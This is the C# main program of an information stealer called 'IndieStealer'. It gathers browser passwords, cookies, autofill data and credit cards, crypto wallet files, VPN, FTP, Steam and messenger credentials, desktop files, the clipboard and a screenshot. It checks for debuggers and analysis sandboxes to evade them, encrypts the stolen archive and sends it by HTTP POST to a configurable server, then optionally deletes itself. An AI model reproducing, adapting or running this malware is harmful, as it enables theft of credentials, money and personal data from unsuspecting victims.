using IndieStealer.Collect;
using IndieStealer.Collect.CryptoWallets;
using IndieStealer.Collect.VPNs;
using IndieStealer.Collect.Browsers;
using System;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Threading.Tasks;
using IndieStealer.Collect.Browsers.Gecko;
using System.Diagnostics;
using System.Drawing.Imaging;
using IndieStealer.Collect.Games;
using IndieStealer.Collect.FTP;
using IndieStealer.Collect.Messengers;
using System.Reflection;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using IndieStealer.Collect.AesGcm.AES;
using IndieStealer.Collect.Browsers.Chromium;
using IndieStealer.Collect.System;
using System.Net.Http;

// ALL CREDITS TO https://github.com/jaime-olivares/zipstorer in ZipStorer.cs

namespace IndieStealer
{

    class Program
    {
        internal static RunData RunData;
        private static ZipStorer zip;
        private Program (bool reRunCheck, bool antiCis, bool deleteAtEnd, string address, string worker, string size)
        {
            HConsole();
            RunData = new RunData()
            {
                ReRunCheck = reRunCheck,
                AntiCIS = antiCis,
                DeleteAtEnd = deleteAtEnd,
                Address = address,
                Worker = worker,
                Size = size
            };
            Detect();
            Collect();
            Uninstall();
            
        }

        private static void Uninstall()
        {
          
            if (RunData.DeleteAtEnd)
            {
                Process process = new Process();
                process.StartInfo = new ProcessStartInfo()
                {
                    FileName = "powershell.exe",
                    UseShellExecute = false,
                    Arguments = $"Sleep 4; Remove-Item -Path \"{Assembly.GetExecutingAssembly().Location}\"",
                };
                process.Start();
            }
            
        }

        private delegate bool FreeConsole();
        private static void HConsole()
        {
            var kernel32 = NativeMethods.LoadLibrary("kernel32.dll");
            var ptr = NativeMethods.GetProcAddress((IntPtr)kernel32, "FreeConsole");
            var delegateForFunctionPointer = Marshal.GetDelegateForFunctionPointer(ptr, typeof(FreeConsole));
            delegateForFunctionPointer.DynamicInvoke(null);
            NativeMethods.FreeLibrary((IntPtr)kernel32);
        }

        static void Main(string[] args)
        {
            new Program(false, false, false, "[SENDADDRESS]", "[WORKER]", "[FILEGRABSIZE]");
        }

        private static void SystemInfo()
        {

            try
            {
                if (MachineInfo.sysData != null)
                {
                    using (MemoryStream memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(Validate(MachineInfo.sysData,"---------------------------------------------"))))
                    {
                        using (MemoryStream memoryStream2 = new MemoryStream(memoryStream.ToArray()))
                        {
                            zip.AddStream(ZipStorer.Compression.Deflate, "System Information.txt", memoryStream2, Info.DateNow, "");
                        }
                    }
                }
            }
            catch (Exception e)
            { }
            try
            {
                if (MachineInfo.clipboard != null && MachineInfo.clipboard != string.Empty)
                {
                    using (MemoryStream clip =
                           new MemoryStream(Encoding.UTF8.GetBytes(MachineInfo.clipboard)))
                        zip.AddStream(ZipStorer.Compression.Deflate, "Clipboard.txt", clip, Info.DateNow, "");
                }
            }
            catch (Exception e)
            { }

            try
            {
                if (MachineInfo.ProcessList != null)
                {
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        foreach (var processElement in MachineInfo.ProcessList)
                        {
                            var Name = Encoding.UTF8.GetBytes(processElement.Name + Environment.NewLine);
                            var ID = Encoding.UTF8.GetBytes(processElement.ID + Environment.NewLine + Environment.NewLine);
                            memoryStream.Write(Name,0,Name.Length);
                            memoryStream.Write(ID,0,ID.Length);
                                
                        }
                        using (MemoryStream memoryStream2 = new MemoryStream(memoryStream.ToArray()))
                            zip.AddStream(ZipStorer.Compression.Deflate, "Process List.txt", memoryStream2, Info.DateNow, "");
                    }
                }
            }
            catch (Exception e)
            { }

            try
            {
                if (MachineInfo.screenBitmap != null)
                {
                    using (MemoryStream prc = new MemoryStream())
                    {
                        MachineInfo.screenBitmap.Save(prc, ImageFormat.Jpeg);
                        using (MemoryStream prc2 = new MemoryStream(prc.ToArray()))
                            zip.AddStream(ZipStorer.Compression.Deflate, "Screenshot.jpg", prc2, Info.DateNow,
                                "Screen");
                    }
                }
            }
            catch (Exception e)
            {}

            try
            {
                if (!string.IsNullOrEmpty(InstalledApps.Apps))
                {
                    using (MemoryStream apps = new MemoryStream(Encoding.UTF8.GetBytes(InstalledApps.Apps)))
                        zip.AddStream(ZipStorer.Compression.Deflate, "Installed Applications.txt", apps,
                            Info.DateNow, "");
                }
            }
            catch (Exception e)
            {
            }
        }
        private static void Crypto()
        {
            foreach (var credential in CWalletList.CWalletCredentials)
            {
                try
                {
                    if (credential.IsExtension)
                    {
                        if (credential.profileNamesAndData == null)
                            continue;
                       
                        foreach (var keyValuePair in credential.profileNamesAndData)
                        {
                            foreach (var file in keyValuePair.Value)
                            {
                                var fileName = Path.GetFileName(file);
                                var newPath = Path.GetTempPath() + fileName;
                                File.Copy(file, newPath,true);                                
                                zip.AddFile(ZipStorer.Compression.Deflate, newPath, "Wallets\\" + credential.Name + "\\" + keyValuePair.Key + "\\" + fileName, "");
                                File.Delete(newPath);
                            }
                                
                        }
                        continue;
                    }
                    if (credential.Data != null && credential.Data.Length > 0 && !string.IsNullOrEmpty(credential.Data[0]))
                    {
                        if (credential.hybridConstruction != null && credential.hybridConstruction.cType ==
                            CWalletData.HybridConstruction.CType.DIR_AND_FILE)
                        {
                            zip.AddDirectory(ZipStorer.Compression.Deflate, credential.Data[0], "Wallets\\" + credential.Name + "\\");
                                                        var fileName = Path.GetFileName(credential.Data[1]);
                            var newPath = Path.GetTempPath() + fileName;
                            File.Copy(credential.Data[1], newPath, true);
                            zip.AddFile(ZipStorer.Compression.Deflate, newPath, "Wallets\\" + credential.Name + "\\" + fileName, "");
                            File.Delete(newPath);
                            
                        }
                        else if (credential.IsFile)
                        {
                            foreach (var file in credential.Data)
                            {

                                var fileName = Path.GetFileName(file);
                                var newPath = Path.GetTempPath() + fileName;
                                File.Copy(file, newPath, true);
                                zip.AddFile(ZipStorer.Compression.Deflate, newPath, "Wallets\\" + credential.Name + "\\" + fileName, "");
                                File.Delete(newPath);

                            }
                        }
                        else
                        {
                            foreach (var dir in credential.Data)
                            {
                                zip.AddDirectory(ZipStorer.Compression.Deflate, dir,
                                    "Wallets\\" + credential.Name + "\\", "");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {}
                    
            }
        }
        private static void DesktopFiles()
        {
            try
            {
                if (!string.IsNullOrEmpty(Desktop.Files[0]))
                {
                    foreach (var file in Desktop.Files)
                    {
                        if (file != "")
                            zip.AddFile(ZipStorer.Compression.Deflate, file, $@"Files\{Path.GetFileName(file)}", "");
                    }
                }
               
            }
            catch (Exception ex)
            { }
        }
        private static void FTP()
        {
            try
            {
                if (!string.IsNullOrEmpty(FileZilla.credentials))
                {
                    using (MemoryStream fz = new MemoryStream(Encoding.UTF8.GetBytes(FileZilla.credentials.ToString())))
                        zip.AddStream(ZipStorer.Compression.Deflate, "FTP\\FileZilla\\FileZilla Servers.txt", fz,
                            Info.DateNow, "");
                }

                if (!string.IsNullOrEmpty(WinSCP.credentials))
                {
                    using (MemoryStream winscp = new MemoryStream(Encoding.UTF8.GetBytes(WinSCP.credentials)))
                        zip.AddStream(ZipStorer.Compression.Deflate, "FTP\\WinSCP\\WinSCP Servers.txt", winscp,
                            Info.DateNow, "");
                }

                if (TotalCommander.credentials != null && TotalCommander.credentials.Length > 0)
                {
                    foreach (var file in TotalCommander.credentials)
                    {
                        zip.AddFile(ZipStorer.Compression.Deflate,file,"FTP\\TotalCommander\\" + Path.GetFileName(file),"");
                    }
                }
            }
            catch (Exception exception)
            {}
        }
        private static void VPN()
        {
            foreach (var vpnClient in VPNClientObject.VPNClientList)
            {
                try
                {
                    if (vpnClient.Data == null || vpnClient.Data.Length < 1)
                        continue;
                    if (vpnClient.IsCredentials)
                    {
                        if (vpnClient.SearchPattern != null)
                        {
                            using (MemoryStream memoryStream = new MemoryStream())
                            {
                                foreach (var line in vpnClient.Data)
                                {
                                    var encodedLine = Encoding.UTF8.GetBytes(line);
                                    memoryStream.Write(encodedLine,0,encodedLine.Length);
                                }
                                using (MemoryStream memoryStream2 = new MemoryStream(memoryStream.ToArray()))
                                    zip.AddStream(ZipStorer.Compression.Deflate, "VPN\\" + vpnClient.Name + "\\User Data.txt", memoryStream2, Info.DateNow, "");
                            }
                        }
                    }
                    else
                    {
                        if (vpnClient.IsDataMultiple)
                        {
                            if (vpnClient.IsFile)
                            {
                                foreach (var file in vpnClient.Data)
                                {
                                    zip.AddFile(ZipStorer.Compression.Deflate, file, "VPN\\"+ vpnClient.Name + "\\" + Path.GetFileName(file), "");
                                }
                            }
                        }
                    }
                }
                catch (Exception exception)
                { }
                
            }
            
        }
        private static void Browsers()
        {
            try
            {
                byte[] allPass = new byte[0];
                foreach (var profile in BrowserDataStorage.BrowserData)
                {
                    if (profile.Value.Autofills != null && profile.Value.Autofills.Count > 0)
                    {
                        using (MemoryStream autofills = new MemoryStream())
                        {
                            foreach (var autofill in profile.Value.Autofills)
                            {
                                string text = Validate(autofill);
                                byte[] text1 = Encoding.UTF8.GetBytes(text);
                                autofills.Write(text1, 0, text1.Length);
                            }
                            byte[] array = autofills.ToArray();
                            Array.Resize(ref array,array.Length - 1);
                            using (MemoryStream autofills2 = new MemoryStream(array))
                            {
                                zip.AddStream(ZipStorer.Compression.Deflate,
                                    $@"Browsers\AutoFills [{profile.Key.BrowserName}#{profile.Key.Name}].txt",
                                    autofills2, Info.DateNow, "AutoFills");
                            }


                        }
                    }
                    if (profile.Value.Bookmarks != null && profile.Value.Bookmarks.Count > 0)
                    {
                        using (MemoryStream bookmarks = new MemoryStream())
                        {
                            foreach (var bookmark in profile.Value.Bookmarks)
                            {
                                string text = Validate(bookmark);
                                byte[] text1 = Encoding.UTF8.GetBytes(text);
                                bookmarks.Write(text1, 0, text1.Length);
                            }
                            byte[] array = bookmarks.ToArray();
                            Array.Resize(ref array,array.Length - 1);
                            using (MemoryStream bookmarks2 = new MemoryStream(array))
                            {
                                zip.AddStream(ZipStorer.Compression.Deflate,
                                    $@"Browsers\Bookmarks [{profile.Key.BrowserName}#{profile.Key.Name}].txt",
                                    bookmarks2, Info.DateNow, "Bookmarks");
                            }


                        }
                    }
                    if (profile.Value.Cookies != null && profile.Value.Cookies.Count > 0)
                    {

                        using (MemoryStream cookies = new MemoryStream())
                        {
                            foreach (var cookie in profile.Value.Cookies)
                            {
                                string text = Validate(cookie, addNewLine: false);
                                if (profile.Value.Cookies.IndexOf(cookie) == profile.Value.Cookies.Count - 1)
                                    text = text.Replace(Environment.NewLine, "");
                                byte[] text1 = Encoding.UTF8.GetBytes(text);
                                cookies.Write(text1, 0, text1.Length);
                            }

                            byte[] array = cookies.ToArray();
                            Array.Resize(ref array,array.Length - 1);
                            using (MemoryStream cookies2 = new MemoryStream(array))
                            {
                                zip.AddStream(ZipStorer.Compression.Deflate, $@"Browsers\Cookies [{profile.Key.BrowserName}#{profile.Key.Name}].txt",
                                    cookies2, Info.DateNow, "Cookies");
                            }
                        }
                    }
                    if (profile.Value.Logins != null && profile.Value.Logins.Count > 0)
                    {
                        using (MemoryStream logins = new MemoryStream())
                        {

                            foreach (var login in profile.Value.Logins)
                            {
                                byte[] text = Encoding.UTF8.GetBytes(
                                    Validate(login,
                                        "________________________") + Environment.NewLine);
                                logins.Write(text, 0, text.Length);
                            }
                            byte[] array = logins.ToArray();
                            Array.Resize(ref array,array.Length - 1);
                            var allPassLength = allPass.Length;
                            var arrayLength = array.Length;
                            var newarrayLength = allPassLength + arrayLength;
                            Array.Resize(ref allPass, newarrayLength);
                            Array.Copy(array, 0, allPass, allPassLength, arrayLength);
                            using (MemoryStream logins2 = new MemoryStream(array))
                            {
                                zip.AddStream(ZipStorer.Compression.Deflate,
                                    $@"Browsers\Passwords [{profile.Key.BrowserName}#{profile.Key.Name}].txt", logins2, Info.DateNow, "Passwords");
                            }
                        }
                    }

                    if (profile.Value.Cards != null && profile.Value.Cards.Count > 0)
                    {
                        using (MemoryStream cc = new MemoryStream())
                        {
                            foreach (var card in profile.Value.Cards)
                            {
                                byte[] text = Encoding.UTF8.GetBytes(
                                    Validate(card, "________________________") +
                                    Environment.NewLine);
                                cc.Write(text, 0, text.Length);
                            }
                            byte[] array = cc.ToArray();
                            Array.Resize(ref array,array.Length - 1);
                            using (MemoryStream cc2 = new MemoryStream(array))
                            {
                                zip.AddStream(ZipStorer.Compression.Deflate, $@"Browsers\CCards [{profile.Key.BrowserName}#{profile.Key.Name}].txt",
                                    cc2, Info.DateNow, "CCards");
                            }
                        }
                    }
                                    
                }

                
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (StreamWriter streamWriter = new StreamWriter(memoryStream))
                    {
                        foreach (var browser in BrowserDataStorage.Browsers)
                        {
                            streamWriter.WriteLine(browser.Name + ". " + browser.InstallPath);
                        }
                    }
                    using (MemoryStream memoryStream1 = new MemoryStream(memoryStream.ToArray()))
                    {
                        zip.AddStream(ZipStorer.Compression.Deflate, "Installed Browsers.txt", memoryStream1, Info.DateNow, "");
                    }


                }

                if (allPass.Length != 0)
                {
                    using (MemoryStream allPasswords = new MemoryStream(allPass))
                        zip.AddStream(ZipStorer.Compression.Deflate, "Passwords.txt", allPasswords, Info.DateNow, "All");

                }



            }
            catch (Exception ex)
            {}
        }
        private static void Games()
        {
            try
            {
                if (!string.IsNullOrEmpty(LunarClient.lunarFile))
                {
                    zip.AddFile(ZipStorer.Compression.Deflate, LunarClient.lunarFile,
                        "Others\\Games\\LunarClientAccounts.json", "");
                }

                if (!string.IsNullOrEmpty(Minecraft.UserData))
                {
                    zip.AddFile(ZipStorer.Compression.Deflate, Minecraft.UserData,
                        $"Others\\Games\\Minecraft\\{Path.GetFileName(Minecraft.UserData)}", "");
                }
            
                if (!string.IsNullOrEmpty(SteamInfo.credentials))
                {
                    using (MemoryStream steam = new MemoryStream(Encoding.UTF8.GetBytes(SteamInfo.credentials)))
                    {
                        zip.AddStream(ZipStorer.Compression.Deflate, "Others\\Games\\Steam Information.txt", steam,
                            Info.DateNow, "");
                        if (!string.IsNullOrEmpty(SteamInfo.sessionFiles[0]))
                        {
                            for (int i = 0; i < 2; i++)
                                zip.AddFile(ZipStorer.Compression.Deflate, SteamInfo.sessionFiles[i],
                                    $"Others\\Games\\Steam\\{Path.GetFileName(SteamInfo.sessionFiles[i])}", "");
                            zip.AddDirectory(ZipStorer.Compression.Deflate, SteamInfo.sessionFiles[2],
                                $"Others\\Games\\Steam\\", "");
                        }
                    }
                }
            }
            catch (Exception exception)
            {}
           
        }
        private static void Messangers()
        {
            try
            {

                if (!string.IsNullOrEmpty(Outlook.foundInfo))
                {
                    using (MemoryStream ol = new MemoryStream(Encoding.UTF8.GetBytes(Outlook.foundInfo)))
                        zip.AddStream(ZipStorer.Compression.Deflate, "Outlook.txt", ol, Info.DateNow, "");
                }

                if (!string.IsNullOrEmpty(Pidgin.Credentials))
                {
                    using (MemoryStream pg = new MemoryStream(Encoding.UTF8.GetBytes(Pidgin.Credentials)))
                        zip.AddStream(ZipStorer.Compression.Deflate, "Others\\Pidgin.txt", pg, Info.DateNow, "");
                }
            }
            catch (Exception exception)
            { }
            
        }
        private static void Collect()
        {
            try
            {
                Action[] actions = {MachineInfo.AllSystemData, MachineInfo.CaptureScreen, MachineInfo.ListAllProcesses, VPNClient.Collect, FileZilla.Collect, WinSCP.Collect, TotalCommander.Collect, Desktop.Collect, SteamInfo.Collect, CWallet.Collect, InstalledApps.Grab, Chromium.GetAutoFills, Chromium.GetCookies, Chromium.GetPasswords, Chromium.GetCards, Gecko.GetBookmarks, Gecko.GetCookies, Gecko.GetPasswords,LunarClient.Collect, Minecraft.Collect, Pidgin.Collect, Outlook.Collect };
                Parallel.Invoke(actions);
            }
            catch (Exception ex)
            { }
            
            MemoryStream memoryStream = new MemoryStream();
            zip = ZipStorer.Create(memoryStream, Info.PentestTool + "\n" + Info.DateNow + " (UTC " + Convert.ToString(Info.UTC) + ")" + "\n" + Guid.NewGuid() + "\n");
            zip.EncodeUTF8 = true;
            Process();
            Send(memoryStream);
        }

        private static void Process()
        {
            SystemInfo();
            Crypto();
            DesktopFiles();
            VPN();
            Games();
            FTP();
            Messangers();
            Browsers();          
            zip.Close();
        }

        private static async void Send(MemoryStream ms)
        {
            
            byte[] array = ms.ToArray();
            if (RunData.Worker.Equals(""))
                RunData.Worker = " ";
            byte[] workerBytes = Encoding.UTF8.GetBytes(RunData.Worker);
            var mainBytes = AESGCM.Encrypt(array, workerBytes);
            var uri = new Uri(RunData.Address);
            byte[] byteMask = { 171, 83, 205, 83 };
            var finalDataLength = workerBytes.Length;
            var mainDataLength = mainBytes.Length;
            Array.Resize(ref workerBytes,finalDataLength + 4 + mainDataLength);
            Array.Copy(byteMask,0,workerBytes,finalDataLength,4);
            Array.Copy(mainBytes,0,workerBytes,finalDataLength + 4,mainDataLength);
            using (HttpClient httpClient = new HttpClient())
            {
                await httpClient.PostAsync(RunData.Address, new StreamContent(new MemoryStream(workerBytes)),new CancellationToken());

            }
        }
        
        
        private static void Detect()
        {
            if (Diagnostics.DebugDetect() || !Diagnostics.CreateMutex() || Diagnostics.AntiEmulation() || Diagnostics.SandboxieDetect() || Diagnostics.AnyRunDetect())
                Environment.Exit(0);

        }

        private static string Validate(object type, string splitter = "", bool addNewLine = true)
        {
            string text = string.Empty;
            try
            {
                Type _type = type.GetType();
                PropertyInfo[] mPropertyInfos = _type.GetProperties();
                foreach (var mProperty in mPropertyInfos)
                {
                    object[] attributes = mProperty.GetCustomAttributes(false);
                    foreach (Attribute attr in attributes)
                    {
                        if (attr is NameValidationAttribute)
                        {
                            object obj = (string)mProperty.GetValue(type, null);
                            if (obj == null)
                                continue;
                            string line = (string)obj;
                            text += line;
                            if (addNewLine)
                                 text += Environment.NewLine;
                        }
                        if (attr is SplitValidationAttribute)
                        {
                            text += splitter + Environment.NewLine;
                        }
                    }
                }

            }
            catch (Exception ex)
            {}

            return text;
            
        }

    }

    struct RunData
    {
        public bool ReRunCheck; 
        public bool AntiCIS;
        public bool DeleteAtEnd;
        public string Address;
        public string Worker;
        public string Size;
    }
    class Diagnostics
    {
        /* This method will work only when Guid attribute is specified in current assembly.*/
        public static bool CreateMutex() 
        {
            
            try
            {
                Mutex Synchronization = new Mutex(initiallyOwned: true,
                ((GuidAttribute)Assembly.GetExecutingAssembly().GetCustomAttributes(typeof(GuidAttribute),
                inherit: false).GetValue(0)).Value.ToString(),
                out var createdNew);

                return createdNew;
            }
            catch { return true; }
        }
        public static bool SandboxieDetect()
        {
            try
            {
                
                if (NativeMethods.GetModuleHandle("SbieDll.dll").ToInt32() != 0)
                    return true;
            }
            catch (Exception ex)
            {}

            return false;
        }

        public static bool DebugDetect()
        {
            try
            {
                if (Process.GetProcessesByName("x64dbg").Length > 0 || Process.GetProcessesByName("x32dbg").Length > 0)
                    return true;
                
            }
            catch (Exception ex)
            {}
            return false;

        }

        public static bool AnyRunDetect()
        {
            try
            {
                foreach (var i in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (i.Name.Contains("4040CF00-1B3E-486A-B407-FA14C56B6FC0") &&
                        i.NetworkInterfaceType == NetworkInterfaceType.Tunnel)
                        return true;
                }
            }
            catch (Exception ex)
            { }
            return false;

        }

        public static bool AntiEmulation()
        {
            try
            {
                return Environment.MachineName.EndsWith("HAL9TH") && Environment.UserName == "JohnDoe";
            }
            catch (Exception ex)
            {}
            return false;
        }
    }
}
